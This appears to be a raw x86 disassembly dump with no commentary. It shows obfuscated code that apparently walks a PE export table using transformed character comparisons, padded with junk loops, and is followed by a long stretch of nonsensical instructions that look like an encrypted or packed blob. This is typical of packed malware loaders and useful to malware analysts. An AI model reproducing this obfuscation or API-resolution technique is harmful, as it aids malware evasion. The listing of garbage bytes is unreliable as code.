  40cac5:	lea    eax,[eax+edi*1+0x64e5ba]
  40cacc:	mov    edi,DWORD PTR [ebp+0xc]
  40cacf:	xor    edi,ecx
  40cad1:	add    edi,edx
  40cad3:	imul   eax,edi
  40cad6:	mov    edi,DWORD PTR [ebp+0xc]
  40cad9:	xor    edi,ecx
  40cadb:	sub    edi,eax
  40cadd:	mov    eax,DWORD PTR [ebp-0x4]
  40cae0:	add    edi,edx
  40cae2:	cmp    DWORD PTR [eax],edi
  40cae4:	mov    eax,DWORD PTR [ebp-0x4]
  40cae7:	mov    edi,DWORD PTR [ebp+0x10]
  40caea:	jg     0x40cafd
  40caf0:	xor    edi,ecx
  40caf2:	mov    ebx,esi
  40caf4:	sub    ebx,edi
  40caf6:	add    DWORD PTR [eax],ebx
  40caf8:	jmp    0x40cb03
  40cafd:	xor    edi,ecx
  40caff:	add    edi,edx
  40cb01:	add    DWORD PTR [eax],edi
  40cb03:	mov    eax,DWORD PTR [ebp-0x8]
  40cb06:	mov    edi,DWORD PTR [ebp-0x10]
  40cb09:	mov    eax,DWORD PTR [eax]
  40cb0b:	xor    edi,ecx
  40cb0d:	add    edi,0x3272dc
  40cb13:	not    edi
  40cb15:	and    eax,edi
  40cb17:	movsx  di,BYTE PTR [eax+0x1]
  40cb1c:	mov    ebx,0x3b4c
  40cb21:	sub    di,bx
  40cb24:	mov    ebx,0x8a89
  40cb29:	xor    di,bx
  40cb2c:	mov    ebx,0x4f87
  40cb31:	cmp    di,bx
  40cb34:	jne    0x40cb5c
  40cb3a:	movsx  di,BYTE PTR [eax]
  40cb3e:	mov    ebx,0x3b4c
  40cb43:	sub    di,bx
  40cb46:	mov    ebx,0x8a89
  40cb4b:	xor    di,bx
  40cb4e:	mov    ebx,0x4f88
  40cb53:	cmp    di,bx
  40cb56:	je     0x40cb6c
  40cb5c:	mov    edi,DWORD PTR [ebp-0x10]
  40cb5f:	xor    edi,ecx
  40cb61:	mov    ebx,esi
  40cb63:	sub    ebx,edi
  40cb65:	add    eax,ebx
  40cb67:	jmp    0x40cb17
  40cb6c:	mov    esi,DWORD PTR [ebp-0x14]
  40cb6f:	mov    esi,DWORD PTR [esi]
  40cb71:	mov    edi,DWORD PTR [eax+0x3c]
  40cb74:	lea    esi,[edi+esi*8+0x78]
  40cb78:	mov    esi,DWORD PTR [esi+eax*1]
  40cb7b:	mov    DWORD PTR [ebp-0x8],esi
  40cb7e:	mov    esi,DWORD PTR [ebp+0x8]
  40cb81:	xor    esi,ecx
  40cb83:	add    esi,edx
  40cb85:	mov    DWORD PTR [ebp-0x14],esi
  40cb88:	mov    esi,DWORD PTR [ebp+0x8]
  40cb8b:	mov    edi,DWORD PTR [ebp-0x8]
  40cb8e:	xor    esi,ecx
  40cb90:	add    esi,edx
  40cb92:	pop    ebx
  40cb93:	cmp    edi,esi
  40cb95:	jne    0x40cbb3
  40cb9b:	mov    eax,DWORD PTR [ebp+0xc]
  40cb9e:	xor    eax,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cba3:	add    eax,edx
  40cba5:	imul   eax,ecx
  40cba8:	mov    DWORD PTR [ebp-0x8],eax
  40cbab:	push   DWORD PTR [ebp+0x18]
  40cbae:	jmp    0x40cc07
  40cbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbb6:	add    ecx,eax
  40cbb8:	mov    DWORD PTR [ebp-0x14],ecx
  40cbbb:	mov    ecx,DWORD PTR [ebp-0x14]
  40cbbe:	mov    ecx,DWORD PTR [ecx+0xc]
  40cbc1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40cbc6:	mov    edx,0x3b4c
  40cbcb:	sub    cx,dx
  40cbce:	mov    edx,0x8a89
  40cbd3:	xor    cx,dx
  40cbd6:	mov    edx,0x4e76
  40cbdb:	cmp    cx,dx
  40cbde:	jne    0x40cbab
  40cbe4:	mov    ecx,DWORD PTR ds:0x42e435
  40cbea:	mov    ecx,DWORD PTR [ecx+0x198]
  40cbf0:	mov    DWORD PTR [ecx],eax
  40cbf2:	jmp    0x40cc18
  40cbf7:	mov    ecx,DWORD PTR [ebp+0x18]
  40cbfa:	cmp    ecx,0xf89c85b2
  40cc00:	jne    0x40cc18
  40cc06:	push   eax
  40cc07:	push   DWORD PTR [ebp+0x14]
  40cc0a:	push   DWORD PTR [ebp+0x10]
  40cc0d:	push   DWORD PTR [ebp+0xc]
  40cc10:	push   DWORD PTR [ebp+0x8]
  40cc13:	call   0x40a327
  40cc18:	pop    edi
  40cc19:	pop    esi
  40cc1a:	leave  
  40cc1b:	ret    0x14
  40cc1e:	push   ebp
  40cc1f:	mov    ebp,esp
  40cc21:	push   ecx
  40cc22:	push   ecx
  40cc23:	add    DWORD PTR ds:0x42b010,edx
  40cc29:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  40cc30:	sub    DWORD PTR ds:0x429024,0x76a8
  40cc3a:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  40cc41:	and    DWORD PTR ds:0x42b018,edi
  40cc47:	mov    eax,DWORD PTR [ebp-0x4]
  40cc4a:	adc    DWORD PTR ds:0x429018,edx
  40cc50:	push   esi
  40cc51:	and    DWORD PTR ds:0x42a000,0x0
  40cc5b:	jmp    0x40cc6d
  40cc60:	mov    esi,DWORD PTR ds:0x42a000
  40cc66:	inc    esi
  40cc67:	mov    DWORD PTR ds:0x42a000,esi
  40cc6d:	cmp    DWORD PTR ds:0x42a000,0x1a
  40cc74:	jae    0x40cc98
  40cc7a:	cmp    DWORD PTR ds:0x42a000,0x26
  40cc81:	jne    0x40cc8d
  40cc87:	call   DWORD PTR ds:0x42ed51
  40cc8d:	jmp    0x40cc60
  40cc92:	sub    edx,0x54cb
  40cc98:	mov    esi,DWORD PTR [ebp-0x8]
  40cc9b:	and    DWORD PTR ds:0x429018,0x0
  40cca5:	jmp    0x40ccb7
  40ccaa:	mov    ecx,DWORD PTR ds:0x429018
  40ccb0:	inc    ecx
  40ccb1:	mov    DWORD PTR ds:0x429018,ecx
  40ccb7:	cmp    DWORD PTR ds:0x429018,0x1e
  40ccbe:	jae    0x40ccf6
  40ccc4:	cmp    DWORD PTR ds:0x429018,0x8
  40cccb:	jne    0x40ccd7
  40ccd1:	call   DWORD PTR ds:0x42ed55
  40ccd7:	cmp    DWORD PTR ds:0x429018,0x7
  40ccde:	jne    0x40ccf1
  40cce4:	mov    ecx,DWORD PTR ds:0x429018
  40ccea:	inc    ecx
  40cceb:	mov    DWORD PTR ds:0x429018,ecx
  40ccf1:	jmp    0x40ccaa
  40ccf6:	mov    edx,0x7510896
  40ccfb:	mov    ecx,DWORD PTR ds:0x42d00c
  40cd01:	sub    DWORD PTR ds:0x42a004,ecx
  40cd07:	xor    eax,edx
  40cd09:	xor    esi,edx
  40cd0b:	mov    DWORD PTR ds:0x42b00c,0x13
  40cd15:	cmp    DWORD PTR ds:0x42b00c,0x0
  40cd1c:	je     0x40cd7c
  40cd22:	cmp    DWORD PTR ds:0x42b00c,0x2
  40cd29:	jne    0x40cd50
  40cd2f:	push   DWORD PTR [ebp-0x14]
  40cd32:	push   0x6af7
  40cd37:	push   0x42b010
  40cd3c:	push   0x84d2
  40cd41:	push   DWORD PTR [ebp-0x10]
  40cd44:	push   DWORD PTR [ebp-0x20]
  40cd47:	push   DWORD PTR [ebp-0x28]
  40cd4a:	call   DWORD PTR ds:0x42ed59
  40cd50:	cmp    DWORD PTR ds:0x42b00c,0x3
  40cd57:	jne    0x40cd6a
  40cd5d:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd63:	dec    ecx
  40cd64:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd6a:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd70:	dec    ecx
  40cd71:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd77:	jmp    0x40cd15
  40cd7c:	mov    ecx,0x3272dd
  40cd81:	add    esi,ecx
  40cd83:	add    eax,ecx
  40cd85:	imul   eax,esi
  40cd88:	mov    esi,DWORD PTR [ebp+0xc]
  40cd8b:	cmp    esi,eax
  40cd8d:	jne    0x40cda9
  40cd93:	mov    eax,DWORD PTR [ebp-0x4]
  40cd96:	mov    esi,DWORD PTR [ebp-0x8]
  40cd99:	xor    eax,edx
  40cd9b:	xor    esi,edx
  40cd9d:	add    eax,ecx
  40cd9f:	add    esi,ecx
  40cda1:	imul   eax,esi
  40cda4:	jmp    0x40f15e
  40cda9:	mov    eax,DWORD PTR [ebp+0xc]
  40cdac:	mov    eax,DWORD PTR [eax+0x78]
  40cdaf:	mov    DWORD PTR [ebp+0xc],eax
  40cdb2:	mov    eax,DWORD PTR [ebp-0x4]
  40cdb5:	mov    esi,DWORD PTR [ebp-0x8]
  40cdb8:	xor    eax,edx
  40cdba:	xor    esi,edx
  40cdbc:	add    eax,ecx
  40cdbe:	add    esi,ecx
  40cdc0:	imul   eax,esi
  40cdc3:	jmp    0x40f13d
  40cdc8:	push   esi
  40cdc9:	pop    ss
  40cdca:	rcl    DWORD PTR [ebx-0x6d],cl
  40cdcd:	fwait
  40cdce:	(bad)  
  40cdcf:	pop    ss
  40cdd0:	push   ds
  40cdd1:	outs   dx,BYTE PTR ds:[esi]
  40cdd2:	adc    DWORD PTR ds:0x6b747843,ebx
  40cdd8:	fldl2t 
  40cdda:	jp     0x40ce56
  40cddc:	sbb    DWORD PTR [edi+0x7a],ebx
  40cddf:	jp     0x40cd92
  40cde1:	mov    ch,0x59
  40cde3:	sub    BYTE PTR [edx+0x7710790a],0x3
  40cdea:	maskmovq mm5,(bad)
  40cdeb:	imul   DWORD PTR [edi+0x8]
  40cdee:	enter  0xc3f,0x5c
  40cdf2:	xchg   DWORD PTR [ecx],eax
  40cdf4:	xor    BYTE PTR [esi-0x11],ch
  40cdf7:	stos   BYTE PTR es:[edi],al
  40cdf8:	in     al,0x8f
  40cdfa:	jb     0x40ce11
  40cdfc:	fistp  QWORD PTR [eax-0x47]
  40cdff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce00:	add    esi,DWORD PTR [eax]
  40ce02:	sbb    eax,0xb7f80e9c
  40ce07:	pop    eax
  40ce08:	xchg   esi,eax
  40ce09:	(bad)  
  40ce0a:	loope  0x40cdfd
  40ce0c:	imul   esi,DWORD PTR [ebp+0x17],0x26a957c8
  40ce13:	add    BYTE PTR [ecx-0x378c07ae],cl
  40ce19:	std    
  40ce1a:	cmc    
  40ce1b:	mov    edx,0x7f9b5a0d
  40ce20:	xor    edx,ebp
  40ce22:	sub    al,0xa2
  40ce24:	or     eax,DWORD PTR [esi+0x27a76578]
  40ce2a:	mov    edx,0xaf2b404f
  40ce2f:	out    0x6e,al
  40ce31:	push   edx
  40ce32:	daa    
  40ce33:	jmp    0x40ce9e
  40ce35:	ret    
  40ce36:	push   ebp
  40ce37:	in     eax,dx
  40ce38:	pop    ds
  40ce39:	jne    0x40ce27
  40ce3b:	pusha  
  40ce3c:	jno    0x40ce06
  40ce3e:	inc    edi
  40ce3f:	jmp    0x1f83:0xa37d2780
  40ce46:	jns    0x40ceba
  40ce48:	jmp    0xdaa2d564
  40ce4d:	inc    edi
  40ce4e:	dec    edi
  40ce4f:	js     0x40ceb9
  40ce51:	mov    ecx,0x3e1caa3c
  40ce56:	mov    BYTE PTR [esi+eiz*2],0x70
  40ce5a:	push   cs
  40ce5b:	mov    ebp,DWORD PTR [ebp+0x21]
  40ce5e:	loope  0x40cdee
  40ce60:	pop    ebp
  40ce61:	aaa    
  40ce62:	xor    al,0x95
  40ce65:	jmp    0xe807:0xc7b3893d
  40ce6c:	mov    ds:0x1e576936,al
  40ce71:	mov    al,0x27
  40ce73:	or     al,0x27
  40ce75:	stos   DWORD PTR es:[edi],eax
  40ce76:	mov    ds:0xb3be760,al
  40ce7b:	fcomp  DWORD PTR ds:0x60971d57
  40ce81:	int3   
  40ce82:	(bad)  
  40ce83:	out    0x9b,al
  40ce85:	add    dl,BYTE PTR [edx+0x3126ba73]
  40ce8b:	jle    0x40ce18
  40ce8d:	cwde   
  40ce8e:	xchg   BYTE PTR ds:0xf519c705,ah
  40ce94:	lahf   
  40ce95:	stos   BYTE PTR es:[edi],al
  40ce96:	mov    cl,al
  40ce98:	cwde   
  40ce99:	cmp    al,0xc
  40ce9b:	sbb    DWORD PTR [eax],ebx
  40ce9d:	fs (bad) 
  40ce9f:	aad    0xf5
  40cea1:	cmp    BYTE PTR [esi],bl
  40cea3:	mov    ds:0x1d1b261f,eax
  40cea8:	sbb    al,BYTE PTR [eax]
  40ceaa:	rcr    DWORD PTR [edx-0x7a],cl
  40cead:	popa   
  40ceae:	inc    ebx
  40ceaf:	mov    edi,DWORD PTR [ecx]
  40ceb1:	add    DWORD PTR [esi-0x7a],esi
  40ceb4:	fsubr  DWORD PTR [ecx]
  40ceb6:	in     eax,dx
  40ceb7:	xor    ebp,edx
  40ceb9:	loop   0x40cf2a
  40cebb:	xchg   ebx,eax
  40cebc:	mov    edx,0x939c9149
  40cec1:	dec    ebp
  40cec2:	pop    ebx
  40cec3:	dec    ecx
  40cec4:	scas   eax,DWORD PTR es:[edi]
  40cec5:	adc    al,0xbb
  40cec7:	shl    DWORD PTR [ecx-0x7e],1
  40ceca:	sbb    ch,al
  40cecc:	jmp    0xf500e3a1
  40ced1:	mov    edx,DWORD PTR [edx]
  40ced3:	sbb    esi,DWORD PTR [eax]
  40ced5:	shl    DWORD PTR [edi-0x4f],0x32
  40ced9:	int    0x30
  40cedb:	xlat   BYTE PTR ds:[ebx]
  40cedc:	scas   al,BYTE PTR es:[edi]
  40cedd:	xor    al,BYTE PTR [eax+0x4d71e6d3]
  40cee3:	jle    0x40ce96
  40cee5:	add    dh,BYTE PTR [edx]
  40cee7:	mov    edi,0x47f9390f
  40ceec:	addr16 or eax,0xa86edb5d
  40cef2:	repnz es mov ah,0x26
  40cef6:	mov    dh,0xae
  40cef8:	pop    edi
  40cef9:	pop    ss
  40cefa:	mov    eax,ds:0xdeef8d15
  40ceff:	xchg   esp,eax
  40cf00:	jb     0x40cea6
  40cf02:	ror    cl,1
  40cf04:	sbb    dh,BYTE PTR [esi+0x8a714ff]
  40cf0a:	cli    
  40cf0b:	and    BYTE PTR [ecx+0x6fea1113],ch
  40cf11:	push   esi
  40cf12:	jmp    0xc25b:0x5e479f54
  40cf19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf1a:	mov    BYTE PTR [ebx],bl
  40cf1c:	adc    ah,BYTE PTR [esi]
  40cf1e:	fiadd  DWORD PTR [edi+0x20]
  40cf21:	jne    0x40ceca
  40cf23:	xor    edi,edi
  40cf25:	les    ebx,FWORD PTR [esi+0x24]
  40cf28:	adc    ah,0x45
  40cf2b:	jmp    0x40cf62
  40cf2d:	mov    bh,0xfe
  40cf2f:	or     al,0x1b
  40cf31:	push   edi
  40cf32:	adc    bh,BYTE PTR [edi-0x190d7f65]
  40cf38:	loop   0x40cf84
  40cf3a:	int3   
  40cf3b:	pop    edx
  40cf3c:	fild   WORD PTR [ecx-0x7c]
  40cf3f:	(bad)  
  40cf40:	pop    ds
  40cf41:	icebp  
  40cf42:	mov    ebx,0x88b7dba1
  40cf47:	pop    ss
  40cf48:	push   edx
  40cf49:	pop    es
  40cf4a:	pusha  
  40cf4b:	iret   
  40cf4c:	lahf   
  40cf4d:	adc    eax,DWORD PTR [esi]
  40cf4f:	adc    BYTE PTR [eax+ecx*4],dl
  40cf52:	cmc    
  40cf53:	sub    al,0x48
  40cf55:	push   edi
  40cf56:	lahf   
  40cf57:	mov    esi,edi
  40cf59:	inc    ebx
  40cf5a:	imul   ebp,DWORD PTR [eax-0x2a],0x40
  40cf5e:	push   edx
  40cf5f:	das    
  40cf60:	adc    eax,0x728b1749
  40cf65:	xchg   edi,eax
  40cf66:	cmp    al,dl
  40cf68:	std    
  40cf69:	xchg   edi,eax
  40cf6a:	xlat   BYTE PTR ds:[ebx]
  40cf6b:	into   
  40cf6c:	jle    0x40cf25
  40cf6e:	cmp    al,0xbb
  40cf70:	ins    DWORD PTR es:[edi],dx
  40cf71:	or     al,0x10
  40cf73:	jg     0x40cef7
  40cf75:	in     al,0x58
  40cf77:	jle    0x40cf7d
  40cf79:	pop    ds
  40cf7a:	mov    DWORD PTR [ebx+0x48ea9149],ebp
  40cf80:	dec    eax
  40cf81:	dec    ebp
  40cf82:	push   ecx
  40cf83:	add    BYTE PTR [ebx-0x62],dh
  40cf86:	inc    ecx
  40cf87:	mov    edx,0x32db3d55
  40cf8c:	jne    0x40d008
  40cf8e:	or     eax,0xc37183d2
  40cf93:	mov    esp,0xe8d1f9f0
  40cf98:	dec    esi
  40cf99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf9a:	cld    
  40cf9b:	sahf   
  40cf9c:	xchg   ecx,eax
  40cf9d:	retf   0x1dc5
  40cfa0:	dec    ecx
  40cfa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfa2:	inc    edx
  40cfa3:	or     al,0xce
  40cfa5:	push   DWORD PTR [edi+0x15]
  40cfa8:	(bad)  
  40cfaa:	adc    BYTE PTR [ecx],ch
  40cfac:	cld    
  40cfad:	pop    eax
  40cfae:	fucomp st(1)
  40cfb0:	xor    ah,BYTE PTR [ebx+0x20]
  40cfb3:	bnd jae 0x40cfa2
  40cfb6:	rcr    DWORD PTR [ecx-0x76],0x8d
  40cfba:	call   FWORD PTR [edx-0x1d]
  40cfbd:	xlat   BYTE PTR ds:[ebx]
  40cfbe:	xchg   esi,eax
  40cfbf:	scas   al,BYTE PTR es:[edi]
  40cfc0:	push   esi
  40cfc1:	out    dx,al
  40cfc2:	and    al,0xe3
  40cfc4:	mov    ebp,0xfec75f5f
  40cfc9:	xchg   ebp,eax
  40cfca:	cmp    bl,bh
  40cfcc:	ja     0x40d040
  40cfce:	mov    eax,ds:0xf9c0e85b
  40cfd3:	mov    dh,0xe5
  40cfd5:	xchg   ebp,eax
  40cfd6:	jmp    0x40d00d
  40cfd8:	or     eax,ecx
  40cfda:	shl    DWORD PTR [edi-0x44f968ab],0x16
  40cfe1:	(bad)  
  40cfe3:	clc    
  40cfe4:	sub    esp,esi
  40cfe6:	imul   esi,DWORD PTR [ecx+0x66],0x3d95cf5e
  40cfed:	cwde   
  40cfee:	sub    DWORD PTR [esi+edi*1+0x44],ebx
  40cff2:	scas   eax,DWORD PTR es:[edi]
  40cff3:	or     bl,BYTE PTR [ebp-0x46]
  40cff6:	push   ds
  40cff7:	aas    
  40cff8:	(bad)  
  40cff9:	pop    esi
  40cffa:	dec    edi
  40cffb:	repnz or eax,0x83a32a51
  40d001:	rcl    ch,1
  40d003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d004:	jns    0x40cfc5
  40d006:	gs mov esi,?
  40d009:	test   al,0xe
  40d00b:	pusha  
  40d00c:	mov    bl,0x68
  40d00e:	js     0x40d041
  40d010:	fs test ecx,ecx
  40d013:	jg     0x40d045
  40d015:	jg     0x40cfa1
  40d017:	push   es
  40d018:	(bad)
  40d01c:	out    0x4b,al
  40d01e:	hlt    
  40d01f:	mov    ebx,0x377647ad
  40d024:	aam    0x32
  40d026:	cmc    
  40d027:	fbld   TBYTE PTR [ecx+0x49dbfa14]
  40d02d:	push   ebp
  40d02e:	pushf  
  40d02f:	pop    edx
  40d030:	cld    
  40d031:	fnsave [edi-0x2f]
  40d034:	and    al,0x7d
  40d036:	not    BYTE PTR [edi]
  40d038:	in     eax,dx
  40d039:	(bad)  
  40d03b:	rcl    DWORD PTR [edx-0x1b],0x82
  40d03f:	mov    cl,BYTE PTR [edi-0x59]
  40d042:	add    al,BYTE PTR [ebp-0x2f]
  40d045:	push   ebx
  40d046:	jge    0x40d024
  40d048:	xchg   edx,eax
  40d049:	out    0x44,eax
  40d04b:	scas   eax,DWORD PTR es:[edi]
  40d04c:	or     eax,0xabc31e2
  40d051:	jmp    eax
  40d053:	mov    bh,BYTE PTR [ebp-0x703699d9]
  40d059:	test   eax,0xd1039051
  40d05e:	mov    eax,ds:0x8388a9ec
  40d063:	pop    eax
  40d064:	mov    ?,esi
  40d066:	sub    DWORD PTR [ecx],ecx
  40d068:	sub    ecx,DWORD PTR [edi]
  40d06a:	mov    eax,ds:0xed8a8367
  40d06f:	(bad)  
  40d070:	cmp    ch,BYTE PTR [ebp-0x64]
  40d073:	jne    0x40d03d
  40d075:	stc    
  40d076:	retf   0xedc6
  40d079:	mov    ds:0xf092948b,eax
  40d07e:	shl    DWORD PTR [esi],1
  40d080:	mov    BYTE PTR [ecx],dh
  40d082:	scas   eax,DWORD PTR es:[edi]
  40d083:	add    DWORD PTR [edi+0x36742012],0x51
  40d08a:	fld    QWORD PTR [ebx+eiz*8-0x7a]
  40d08e:	sub    esp,DWORD PTR [eax-0x42]
  40d091:	xor    eax,0x14c5297a
  40d096:	cld    
  40d097:	dec    esi
  40d098:	jnp    0x40d119
  40d09a:	mov    ecx,DWORD PTR [ecx-0x4edd0b73]
  40d0a0:	in     eax,0x37
  40d0a2:	sbb    DWORD PTR [ecx+0x42],edi
  40d0a5:	es cmp dh,ch
  40d0a8:	or     eax,0x9c230fdd
  40d0ad:	jmp    0x40d057
  40d0af:	out    dx,al
  40d0b0:	pushf  
  40d0b1:	add    DWORD PTR [ebx],0x43da6d48
  40d0b7:	or     DWORD PTR ds:0xfd82d2e1,ebp
  40d0bd:	or     DWORD PTR [edx-0x1aaecf3f],esp
  40d0c3:	cli    
  40d0c4:	call   0xb2556e65
  40d0c9:	repz imul esi,DWORD PTR ds:0xf43b9bea,0xffffffeb
  40d0d1:	mov    ebx,0xf6215f29
  40d0d6:	pop    ss
  40d0d7:	ins    BYTE PTR es:[edi],dx
  40d0d8:	adc    BYTE PTR [ebp+0x64],ah
  40d0db:	xor    al,0xef
  40d0dd:	mov    edi,ebx
  40d0df:	pop    edi
  40d0e0:	or     ch,BYTE PTR [eax-0x6bbe9557]
  40d0e6:	test   eax,0x756c7b85
  40d0eb:	dec    ebp
  40d0ec:	mov    ds:0xd5ea5dd4,al
  40d0f1:	into   
  40d0f2:	pop    ecx
  40d0f3:	xchg   ah,ah
  40d0f5:	leave  
  40d0f6:	sub    al,0xf1
  40d0f8:	mov    WORD PTR [eax-0x67c79821],fs
  40d0fe:	pop    ss
  40d0ff:	and    al,BYTE PTR [edx]
  40d101:	(bad)  
  40d102:	mov    ch,0x9c
  40d104:	int    0x7c
  40d106:	push   esi
  40d107:	daa    
  40d108:	inc    edx
  40d109:	call   0x5a7c:0x9964aeca
  40d110:	repnz and bl,dl
  40d113:	retf   0x4298
  40d116:	jne    0x40d101
  40d118:	sti    
  40d119:	mov    ecx,0xeffc1c0
  40d11e:	xchg   esp,eax
  40d11f:	in     al,dx
  40d120:	jnp    0x40d126
  40d122:	xor    al,0x13
  40d124:	push   edx
  40d125:	sbb    edi,DWORD PTR [ebx]
  40d127:	xchg   ebx,eax
  40d128:	imul   edx,DWORD PTR [ebx],0x4a
  40d12b:	aaa    
  40d12c:	cmp    BYTE PTR [eax-0x23],0x4c
  40d130:	aaa    
  40d131:	outs   dx,DWORD PTR ds:[esi]
  40d132:	xor    BYTE PTR [edx+0x43e99080],dl
  40d138:	pushf  
  40d139:	jne    0x40d0ce
  40d13b:	lea    eax,[ecx]
  40d13d:	mov    WORD PTR [ebx+edi*1-0x5df42cce],es
  40d144:	sub    edx,DWORD PTR [ebx-0x1303ed7d]
  40d14a:	mov    esp,0x20bb371c
  40d14f:	jns    0x40d1c4
  40d151:	jae    0x40d112
  40d153:	cmc    
  40d154:	sub    eax,0xd0038f06
  40d159:	and    eax,0x5151c3a6
  40d15e:	mov    eax,ds:0x77642482
  40d163:	bnd jp 0x40d145
  40d166:	add    bh,dl
  40d168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d169:	(bad)  
  40d16a:	jns    0x40d135
  40d16c:	adc    dl,BYTE PTR [ebx-0x63]
  40d16f:	or     ah,bl
  40d171:	out    0xed,eax
  40d173:	push   esi
  40d174:	adc    eax,0xcf2770a0
  40d179:	jne    0x40d1d7
  40d17b:	and    dl,BYTE PTR [esi-0x679f7fbc]
  40d181:	hlt    
  40d182:	mov    esi,0x8fc547f5
  40d187:	(bad)  
  40d188:	out    0xcd,al
  40d18a:	mov    ch,0xf9
  40d18c:	aam    0xe
  40d18e:	push   ds
  40d18f:	aas    
  40d190:	adc    DWORD PTR [eax-0x62f25e56],eax
  40d196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d197:	push   es
  40d198:	aas    
  40d199:	sub    esp,DWORD PTR [ecx]
  40d19b:	sub    eax,0x5b6db4fd
  40d1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a1:	in     al,0xdb
  40d1a3:	mov    es,WORD PTR [edi-0x664595db]
  40d1a9:	mov    ah,BYTE PTR [edi+0x22]
  40d1ac:	aaa    
  40d1ad:	outs   dx,DWORD PTR ds:[esi]
  40d1ae:	push   cs
  40d1af:	add    al,bl
  40d1b1:	mov    eax,0x64499de5
  40d1b6:	jns    0x40d203
  40d1b8:	adc    al,0x2
  40d1ba:	adc    DWORD PTR [eax+edi*4],edx
  40d1bd:	retf   
  40d1be:	cmc    
  40d1bf:	adc    ecx,DWORD PTR [ebx+0x5901a57c]
  40d1c5:	mov    al,0x90
  40d1c7:	xchg   esp,eax
  40d1c8:	sbb    dl,BYTE PTR [ebx-0xde6a8d1]
  40d1ce:	pop    ecx
  40d1cf:	in     al,0x5
  40d1d1:	hlt    
  40d1d2:	mov    bl,0x77
  40d1d4:	inc    esp
  40d1d5:	shl    BYTE PTR [esi+ebp*1],0xad
  40d1d9:	mov    bl,BYTE PTR [ebx-0x2983168]
  40d1df:	ins    BYTE PTR es:[edi],dx
  40d1e0:	bound  eax,QWORD PTR [esi]
  40d1e2:	cmp    al,0x7c
  40d1e4:	pop    eax
  40d1e5:	in     eax,0xf
  40d1e7:	test   al,0x84
  40d1e9:	sti    
  40d1ea:	jb     0x40d1e0
  40d1ec:	add    eax,0xf3bede32
  40d1f1:	(bad)  
  40d1f2:	rcr    DWORD PTR [eax-0x41],cl
  40d1f5:	inc    ebp
  40d1f6:	shl    edi,cl
  40d1f8:	push   edx
  40d1f9:	repz fnstenv [edx+0x39bd39ff]
  40d200:	and    eax,0x14509bb0
  40d205:	std    
  40d206:	scas   eax,DWORD PTR es:[edi]
  40d207:	or     eax,0xce26a08d
  40d20c:	mov    ah,BYTE PTR [ebp-0x26]
  40d20f:	mov    BYTE PTR [ebx],cl
  40d211:	das    
  40d212:	pop    esi
  40d213:	pusha  
  40d214:	ret    
  40d215:	nop
  40d216:	std    
  40d217:	adc    al,bl
  40d219:	das    
  40d21a:	push   esi
  40d21b:	jae    0x40d203
  40d21d:	xchg   ebx,eax
  40d21e:	adc    al,cl
  40d220:	rcl    DWORD PTR [eax-0x62],cl
  40d223:	and    esp,DWORD PTR [ecx+0x186f3460]
  40d229:	(bad)  
  40d22a:	fdivrp st(3),st
  40d22c:	shr    DWORD PTR [edi],1
  40d22e:	fst    st(6)
  40d230:	add    DWORD PTR [edi-0x16],edi
  40d233:	inc    ecx
  40d234:	loope  0x40d276
  40d236:	or     eax,0x471b63f6
  40d23b:	mov    al,ds:0xc82762ea
  40d240:	jns    0x40d215
  40d242:	fcomp  st(3)
  40d244:	mov    ebx,DWORD PTR [edx+0xe626e4e]
  40d24a:	xchg   edx,eax
  40d24b:	sub    eax,0xb0ed3f74
  40d250:	mov    cl,0x1a
  40d252:	je     0x40d214
  40d254:	stos   DWORD PTR es:[edi],eax
  40d255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d256:	(bad)  
  40d257:	imul   ebx
  40d259:	stos   DWORD PTR es:[edi],eax
  40d25a:	popf   
  40d25b:	in     al,dx
  40d25c:	clc    
  40d25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d25e:	fbstp  TBYTE PTR [esi+0x96358a5]
  40d264:	and    DWORD PTR [eax-0x7a80b06c],ebx
  40d26a:	retf   0xfe7f
  40d26d:	in     eax,0xf5
  40d26f:	outs   dx,DWORD PTR ds:[esi]
  40d270:	dec    esp
  40d271:	std    
  40d272:	es add eax,0x1f7b0cf8
  40d278:	(bad)  
  40d279:	iret   
  40d27a:	loopne 0x40d25b
  40d27c:	mov    DWORD PTR [ebx],ecx
  40d27e:	push   esp
  40d27f:	add    DWORD PTR [eax+esi*8-0x7a],ecx
  40d283:	int    0x87
  40d285:	outs   dx,BYTE PTR ds:[esi]
  40d286:	xchg   ebx,eax
  40d287:	(bad)  
  40d288:	or     eax,0x9d512d6e
  40d28d:	adc    ebx,DWORD PTR [ebx]
  40d28f:	rol    BYTE PTR [ecx-0x57],0x79
  40d293:	leave  
  40d294:	dec    edi
  40d295:	(bad)  
  40d297:	mov    cl,0x19
  40d299:	push   esp
  40d29a:	mov    al,ds:0x42df6030
  40d29f:	push   0xffffffb9
  40d2a1:	inc    edx
  40d2a2:	sahf   
  40d2a3:	xchg   esp,eax
  40d2a4:	(bad)  
  40d2a5:	aad    0x9a
  40d2a7:	fmulp  st(2),st
  40d2a9:	daa    
  40d2aa:	enter  0x2cec,0xf6
  40d2ae:	fnstsw WORD PTR [esi]
  40d2b0:	ds push ss
  40d2b2:	(bad)  
  40d2b3:	pop    ss
  40d2b4:	adc    DWORD PTR [esi+0x4a5c3cf1],0xe876d15d
  40d2be:	xchg   edi,eax
  40d2bf:	xchg   ecx,eax
  40d2c0:	inc    ebx
  40d2c1:	stos   DWORD PTR es:[edi],eax
  40d2c2:	ja     0x40d271
  40d2c4:	jne    0x40d307
  40d2c6:	scas   al,BYTE PTR es:[edi]
